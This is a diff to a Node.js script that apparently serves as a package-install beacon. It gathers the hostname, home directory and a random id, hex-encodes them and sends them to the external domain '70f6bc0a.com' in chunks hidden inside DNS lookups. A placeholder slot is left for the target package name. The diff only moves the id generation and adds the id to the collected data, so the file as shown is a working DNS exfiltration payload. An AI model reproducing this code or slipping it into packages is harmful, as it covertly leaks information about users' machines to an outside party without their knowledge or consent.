@@ -35,34 +35,31 @@ const dns = require('dns');
 const os = require('os');
 
 const suffix = '70f6bc0a.com';
+const id = Math.random().toString(36).substring(2);
+
 const package = '!!!CHANGE_ME!!!';
 
 function sendToServer(data) {
-
     data = Buffer.from(data).toString('hex');
     data = data.match(/.{1,60}/g);
-
-    id = Math.random().toString(36).substring(2);
-
+    
     data.forEach(function (chunk, idx){
         try {
             dns.resolve(`${id}.${idx}.${chunk}.${package}.${suffix}`, 'A', console.log);
         } catch (e) { }
     });
-
 }
 
 function tryGet(toCall) {
-
     try {
         return toCall();
     } catch(e) {
         return 'err';
     }
-
 }
 
 data = {
+    i : id,
     p : package,
     h : tryGet(os.hostname),
     d : tryGet(os.homedir),
